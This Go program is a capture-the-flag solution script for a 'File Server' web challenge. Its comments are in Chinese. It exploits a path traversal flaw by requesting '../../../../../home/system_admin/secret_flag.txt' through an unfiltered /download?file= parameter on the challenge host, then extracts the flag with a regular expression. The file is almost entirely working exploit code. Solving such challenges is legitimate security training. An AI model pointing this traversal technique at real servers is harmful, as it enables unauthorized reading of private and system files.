// =============================================================================
// 题目名称: File Server
// 题目类别: Web - 路径遍历 (Path Traversal)
// 解题思路: 下载接口未过滤 ../，通过路径遍历读取
//
//	/home/system_admin/secret_flag.txt
//
// 用法: go run NovruzCTF_python-serverl.go [目标地址]
//
//	示例: go run NovruzCTF_python-serverl.go https://58538afc0c.chall.canyouhack.org
//
// =============================================================================
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
)

const defaultBaseURL = "https://58538afc0c.chall.canyouhack.org"

func main() {
	base := defaultBaseURL
	if len(os.Args) > 1 {
		base = os.Args[1]
	}

	path := "../../../../../home/system_admin/secret_flag.txt"
	u := base + "/download?file=" + url.QueryEscape(path)

	resp, err := http.Get(u)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 请求失败: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	re := regexp.MustCompile(`novruzCTF\{[^}]+\}`)
	m := re.Find(body)
	if m == nil {
		fmt.Fprintln(os.Stderr, "[!] 未找到 flag，响应内容:")
		fmt.Println(string(body))
		os.Exit(1)
	}
	fmt.Println(string(m))
}
